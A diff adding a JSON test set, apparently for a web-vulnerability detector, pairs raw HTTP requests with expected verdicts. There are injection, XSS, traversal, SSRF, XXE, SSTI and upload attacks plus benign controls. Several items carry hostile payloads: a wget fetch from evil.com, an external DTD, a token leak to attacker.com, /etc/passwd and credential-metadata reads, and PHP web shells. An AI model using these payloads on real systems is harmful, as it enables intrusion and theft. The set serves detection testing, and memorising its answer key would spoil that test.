@@ -1,0 +1,450 @@
+[
+  {
+    "id": "sqli_01",
+    "category": "SQL注入",
+    "expected_is_vulnerable": true,
+    "expected_type": "SQL注入",
+    "expected_min_confidence": 80,
+    "raw_http": "GET /vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit HTTP/1.1\nHost: dvwa.test\nCookie: PHPSESSID=abc123; security=low"
+  },
+  {
+    "id": "sqli_02",
+    "category": "SQL注入",
+    "expected_is_vulnerable": true,
+    "expected_type": "SQL注入",
+    "expected_min_confidence": 75,
+    "raw_http": "GET /product?id=1 UNION SELECT username,password FROM users-- HTTP/1.1\nHost: shop.test\nCookie: session=xyz"
+  },
+  {
+    "id": "sqli_03",
+    "category": "SQL注入",
+    "expected_is_vulnerable": true,
+    "expected_type": "SQL注入",
+    "expected_min_confidence": 70,
+    "raw_http": "POST /api/login HTTP/1.1\nHost: app.test\nContent-Type: application/x-www-form-urlencoded\nCookie: session=token123\n\nusername=admin'--&password=anything"
+  },
+  {
+    "id": "sqli_04",
+    "category": "SQL注入",
+    "expected_is_vulnerable": true,
+    "expected_type": "SQL注入",
+    "expected_min_confidence": 75,
+    "raw_http": "GET /search?q=' OR 1=1#&page=1 HTTP/1.1\nHost: search.test"
+  },
+  {
+    "id": "sqli_05",
+    "category": "SQL注入",
+    "expected_is_vulnerable": true,
+    "expected_type": "SQL注入",
+    "expected_min_confidence": 70,
+    "raw_http": "GET /user/profile?id=1;DROP TABLE users-- HTTP/1.1\nHost: social.test\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9"
+  },
+  {
+    "id": "sqli_06",
+    "category": "SQL注入",
+    "expected_is_vulnerable": true,
+    "expected_type": "SQL注入",
+    "expected_min_confidence": 70,
+    "raw_http": "POST /api/products HTTP/1.1\nHost: api.test\nContent-Type: application/json\n\n{\"name\":\"test\",\"category_id\":\"1 AND SLEEP(5)--\"}"
+  },
+  {
+    "id": "xss_01",
+    "category": "XSS",
+    "expected_is_vulnerable": true,
+    "expected_type": "XSS",
+    "expected_min_confidence": 80,
+    "raw_http": "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1\nHost: web.test\nCookie: session=abc"
+  },
+  {
+    "id": "xss_02",
+    "category": "XSS",
+    "expected_is_vulnerable": true,
+    "expected_type": "XSS",
+    "expected_min_confidence": 75,
+    "raw_http": "GET /comment?name=<img src=x onerror=alert(1)> HTTP/1.1\nHost: blog.test"
+  },
+  {
+    "id": "xss_03",
+    "category": "XSS",
+    "expected_is_vulnerable": true,
+    "expected_type": "XSS",
+    "expected_min_confidence": 80,
+    "raw_http": "GET /page?callback=<svg onload=alert(document.domain)> HTTP/1.1\nHost: app.test"
+  },
+  {
+    "id": "xss_04",
+    "category": "XSS",
+    "expected_is_vulnerable": true,
+    "expected_type": "XSS",
+    "expected_min_confidence": 75,
+    "raw_http": "POST /api/comment HTTP/1.1\nHost: forum.test\nContent-Type: application/json\n\n{\"content\":\"<iframe src=javascript:alert(1)></iframe>\",\"post_id\":42}"
+  },
+  {
+    "id": "xss_05",
+    "category": "XSS",
+    "expected_is_vulnerable": true,
+    "expected_type": "XSS",
+    "expected_min_confidence": 70,
+    "raw_http": "GET /redirect?url=javascript:alert(document.cookie) HTTP/1.1\nHost: old.test"
+  },
+  {
+    "id": "xss_06",
+    "category": "XSS",
+    "expected_is_vulnerable": true,
+    "expected_type": "XSS",
+    "expected_min_confidence": 70,
+    "raw_http": "POST /profile/update HTTP/1.1\nHost: social.test\nContent-Type: application/x-www-form-urlencoded\n\nnickname=<body onload=alert('XSS')>"
+  },
+  {
+    "id": "cmdi_01",
+    "category": "命令注入",
+    "expected_is_vulnerable": true,
+    "expected_type": "命令注入",
+    "expected_min_confidence": 85,
+    "raw_http": "POST /api/ping HTTP/1.1\nHost: nettools.test\nContent-Type: application/x-www-form-urlencoded\n\nip=127.0.0.1;cat /etc/passwd"
+  },
+  {
+    "id": "cmdi_02",
+    "category": "命令注入",
+    "expected_is_vulnerable": true,
+    "expected_type": "命令注入",
+    "expected_min_confidence": 80,
+    "raw_http": "POST /api/dns-lookup HTTP/1.1\nHost: admin.test\nContent-Type: application/json\n\n{\"host\":\"example.com|whoami\"}"
+  },
+  {
+    "id": "cmdi_03",
+    "category": "命令注入",
+    "expected_is_vulnerable": true,
+    "expected_type": "命令注入",
+    "expected_min_confidence": 85,
+    "raw_http": "GET /api/exec?cmd=127.0.0.1 && id HTTP/1.1\nHost: monitor.test"
+  },
+  {
+    "id": "cmdi_04",
+    "category": "命令注入",
+    "expected_is_vulnerable": true,
+    "expected_type": "命令注入",
+    "expected_min_confidence": 80,
+    "raw_http": "POST /api/system/ping HTTP/1.1\nHost: iot.test\nContent-Type: application/x-www-form-urlencoded\n\ntarget=8.8.8.8$(wget http://evil.com/shell.sh)"
+  },
+  {
+    "id": "cmdi_05",
+    "category": "命令注入",
+    "expected_is_vulnerable": true,
+    "expected_type": "命令注入",
+    "expected_min_confidence": 75,
+    "raw_http": "GET /tools/ping?host=google.com`id` HTTP/1.1\nHost: tools.test"
+  },
+  {
+    "id": "path_01",
+    "category": "路径穿越",
+    "expected_is_vulnerable": true,
+    "expected_type": "路径穿越",
+    "expected_min_confidence": 75,
+    "raw_http": "GET /download?file=../../../../etc/passwd HTTP/1.1\nHost: file.test"
+  },
+  {
+    "id": "path_02",
+    "category": "路径穿越",
+    "expected_is_vulnerable": true,
+    "expected_type": "路径穿越",
+    "expected_min_confidence": 70,
+    "raw_http": "GET /images?path=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1\nHost: cdn.test"
+  },
+  {
+    "id": "path_03",
+    "category": "路径穿越",
+    "expected_is_vulnerable": true,
+    "expected_type": "路径穿越",
+    "expected_min_confidence": 70,
+    "raw_http": "GET /static/../../../app/config/database.yml HTTP/1.1\nHost: web.test"
+  },
+  {
+    "id": "path_04",
+    "category": "路径穿越",
+    "expected_is_vulnerable": true,
+    "expected_type": "路径穿越",
+    "expected_min_confidence": 70,
+    "raw_http": "GET /api/file/read?name=....//....//etc/passwd HTTP/1.1\nHost: api.test"
+  },
+  {
+    "id": "ssrf_01",
+    "category": "SSRF",
+    "expected_is_vulnerable": true,
+    "expected_type": "SSRF",
+    "expected_min_confidence": 70,
+    "raw_http": "POST /api/fetch-url HTTP/1.1\nHost: preview.test\nContent-Type: application/json\n\n{\"url\":\"http://127.0.0.1:8080/admin\"}"
+  },
+  {
+    "id": "ssrf_02",
+    "category": "SSRF",
+    "expected_is_vulnerable": true,
+    "expected_type": "SSRF",
+    "expected_min_confidence": 75,
+    "raw_http": "GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1\nHost: cloud.test"
+  },
+  {
+    "id": "ssrf_03",
+    "category": "SSRF",
+    "expected_is_vulnerable": true,
+    "expected_type": "SSRF",
+    "expected_min_confidence": 70,
+    "raw_http": "POST /api/webhook/test HTTP/1.1\nHost: service.test\nContent-Type: application/json\n\n{\"callback_url\":\"file:///etc/passwd\"}"
+  },
+  {
+    "id": "ssrf_04",
+    "category": "SSRF",
+    "expected_is_vulnerable": true,
+    "expected_type": "SSRF",
+    "expected_min_confidence": 65,
+    "raw_http": "GET /api/screenshot?url=gopher://127.0.0.1:6379/_INFO HTTP/1.1\nHost: tool.test"
+  },
+  {
+    "id": "xxe_01",
+    "category": "XXE",
+    "expected_is_vulnerable": true,
+    "expected_type": "XXE",
+    "expected_min_confidence": 75,
+    "raw_http": "POST /api/xml-parse HTTP/1.1\nHost: api.test\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+  },
+  {
+    "id": "xxe_02",
+    "category": "XXE",
+    "expected_is_vulnerable": true,
+    "expected_type": "XXE",
+    "expected_min_confidence": 70,
+    "raw_http": "POST /api/import HTTP/1.1\nHost: app.test\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\"> %dtd;]><data>test</data>"
+  },
+  {
+    "id": "xxe_03",
+    "category": "XXE",
+    "expected_is_vulnerable": true,
+    "expected_type": "XXE",
+    "expected_min_confidence": 70,
+    "raw_http": "POST /api/upload/xml HTTP/1.1\nHost: service.test\nContent-Type: text/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal-server:8080/secret\">]><foo>read</foo>"
+  },
+  {
+    "id": "ssti_01",
+    "category": "SSTI",
+    "expected_is_vulnerable": true,
+    "expected_type": "SSTI",
+    "expected_min_confidence": 75,
+    "raw_http": "GET /render?name={{7*7}} HTTP/1.1\nHost: app.test"
+  },
+  {
+    "id": "ssti_02",
+    "category": "SSTI",
+    "expected_is_vulnerable": true,
+    "expected_type": "SSTI",
+    "expected_min_confidence": 75,
+    "raw_http": "GET /page?template=${7*7} HTTP/1.1\nHost: web.test"
+  },
+  {
+    "id": "ssti_03",
+    "category": "SSTI",
+    "expected_is_vulnerable": true,
+    "expected_type": "SSTI",
+    "expected_min_confidence": 70,
+    "raw_http": "GET /email/preview?tpl={{config.SQLALCHEMY_DATABASE_URI}} HTTP/1.1\nHost: admin.test"
+  },
+  {
+    "id": "ssti_04",
+    "category": "SSTI",
+    "expected_is_vulnerable": true,
+    "expected_type": "SSTI",
+    "expected_min_confidence": 70,
+    "raw_http": "GET /api/template?name={%import os%}{{os.popen('id').read()}} HTTP/1.1\nHost: render.test"
+  },
+  {
+    "id": "nosql_01",
+    "category": "NoSQL注入",
+    "expected_is_vulnerable": true,
+    "expected_type": "NoSQL注入",
+    "expected_min_confidence": 70,
+    "raw_http": "POST /api/login HTTP/1.1\nHost: api.test\nContent-Type: application/json\n\n{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}"
+  },
+  {
+    "id": "nosql_02",
+    "category": "NoSQL注入",
+    "expected_is_vulnerable": true,
+    "expected_type": "NoSQL注入",
+    "expected_min_confidence": 70,
+    "raw_http": "POST /api/users/search HTTP/1.1\nHost: app.test\nContent-Type: application/json\n\n{\"name\":{\"$gt\":\"\"},\"$where\":\"this.password.length > 5\"}"
+  },
+  {
+    "id": "nosql_03",
+    "category": "NoSQL注入",
+    "expected_is_vulnerable": true,
+    "expected_type": "NoSQL注入",
+    "expected_min_confidence": 65,
+    "raw_http": "GET /api/user?role[$ne]=guest&status[$regex]=^admin HTTP/1.1\nHost: nosql.test"
+  },
+  {
+    "id": "redirect_01",
+    "category": "开放重定向",
+    "expected_is_vulnerable": true,
+    "expected_type": "开放重定向",
+    "expected_min_confidence": 60,
+    "raw_http": "GET /login?redirect=https://evil.com/phishing HTTP/1.1\nHost: app.test"
+  },
+  {
+    "id": "redirect_02",
+    "category": "开放重定向",
+    "expected_is_vulnerable": true,
+    "expected_type": "开放重定向",
+    "expected_min_confidence": 55,
+    "raw_http": "GET /auth/callback?next=https://attacker.com/steal?token= HTTP/1.1\nHost: oauth.test"
+  },
+  {
+    "id": "redirect_03",
+    "category": "开放重定向",
+    "expected_is_vulnerable": true,
+    "expected_type": "开放重定向",
+    "expected_min_confidence": 55,
+    "raw_http": "GET /go?url=https://evil.com HTTP/1.1\nHost: shortener.test"
+  },
+  {
+    "id": "upload_01",
+    "category": "文件上传",
+    "expected_is_vulnerable": true,
+    "expected_type": "文件上传",
+    "expected_min_confidence": 65,
+    "raw_http": "POST /api/upload HTTP/1.1\nHost: app.test\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php.jpg\"\nContent-Type: image/jpeg\n\n<?php @eval($_POST['cmd']); ?>\n------WebKitFormBoundary--"
+  },
+  {
+    "id": "upload_02",
+    "category": "文件上传",
+    "expected_is_vulnerable": true,
+    "expected_type": "文件上传",
+    "expected_min_confidence": 65,
+    "raw_http": "POST /api/avatar HTTP/1.1\nHost: social.test\nContent-Type: multipart/form-data; boundary=----Boundary\n\n------Boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"../../var/www/html/shell.php\"\nContent-Type: application/x-php\n\n<?php system($_GET['cmd']); ?>\n------Boundary--"
+  },
+  {
+    "id": "upload_03",
+    "category": "文件上传",
+    "expected_is_vulnerable": true,
+    "expected_type": "文件上传",
+    "expected_min_confidence": 60,
+    "raw_http": "POST /api/upload HTTP/1.1\nHost: file.test\nContent-Type: multipart/form-data; boundary=----FormBoundary\n\n------FormBoundary\nContent-Disposition: form-data; name=\"file\"; filename=\"test.phtml\"\nContent-Type: image/png\n\nGIF89a<?php echo shell_exec($_GET['cmd']); ?>\n------FormBoundary--"
+  },
+  {
+    "id": "safe_01",
+    "category": "正常请求",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "GET /api/products?page=1&size=10&category=electronics HTTP/1.1\nHost: shop.test\nAccept: application/json"
+  },
+  {
+    "id": "safe_02",
+    "category": "正常请求",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "POST /api/login HTTP/1.1\nHost: app.test\nContent-Type: application/json\n\n{\"username\":\"alice\",\"password\":\"MySecurePass123!\"}"
+  },
+  {
+    "id": "safe_03",
+    "category": "正常请求",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "GET /user/profile HTTP/1.1\nHost: social.test\nCookie: session=valid_token_here\nAccept: text/html"
+  },
+  {
+    "id": "safe_04",
+    "category": "正常请求",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "GET /search?q=python+tutorial&page=2&sort=relevance HTTP/1.1\nHost: search.test"
+  },
+  {
+    "id": "safe_05",
+    "category": "正常请求",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "POST /api/comment HTTP/1.1\nHost: blog.test\nContent-Type: application/json\nAuthorization: Bearer valid_token\n\n{\"content\":\"Great article, thanks for sharing!\",\"post_id\":42}"
+  },
+  {
+    "id": "safe_06",
+    "category": "正常请求",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "GET /static/js/app.bundle.js HTTP/1.1\nHost: cdn.test\nAccept-Encoding: gzip"
+  },
+  {
+    "id": "safe_07",
+    "category": "正常请求",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "PUT /api/user/123 HTTP/1.1\nHost: api.test\nContent-Type: application/json\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9\n\n{\"email\":\"user@example.com\",\"phone\":\"13800138000\"}"
+  },
+  {
+    "id": "safe_08",
+    "category": "正常请求",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "GET /api/weather?city=Beijing&units=metric HTTP/1.1\nHost: weather.test"
+  },
+  {
+    "id": "safe_09",
+    "category": "正常请求",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "POST /api/contact HTTP/1.1\nHost: corp.test\nContent-Type: application/x-www-form-urlencoded\n\nname=Zhang+San&email=zhangsan%40example.com&message=Hello+World"
+  },
+  {
+    "id": "safe_10",
+    "category": "正常请求",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "GET /article/12345 HTTP/1.1\nHost: news.test\nAccept: text/html\nAccept-Language: zh-CN"
+  },
+  {
+    "id": "safe_11",
+    "category": "正常请求",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "DELETE /api/tasks/456 HTTP/1.1\nHost: tasks.test\nAuthorization: Bearer valid_jwt_token"
+  },
+  {
+    "id": "safe_12",
+    "category": "正常请求",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "GET /api/v1/orders?status=paid&limit=20 HTTP/1.1\nHost: shop.test\nAccept: application/json"
+  },
+  {
+    "id": "edge_01",
+    "category": "边界用例",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "GET /search?q=O'Brien HTTP/1.1\nHost: shop.test"
+  },
+  {
+    "id": "edge_02",
+    "category": "边界用例",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "GET /page?id=100 HTTP/1.1\nHost: web.test\nCookie: session=abc; theme=dark"
+  },
+  {
+    "id": "edge_03",
+    "category": "边界用例",
+    "expected_is_vulnerable": false,
+    "expected_type": null,
+    "expected_min_confidence": 0,
+    "raw_http": "POST /api/search HTTP/1.1\nHost: api.test\nContent-Type: application/json\n\n{\"query\":\"SELECT all products\",\"filter\":\"category=books\"}"
+  }
+]
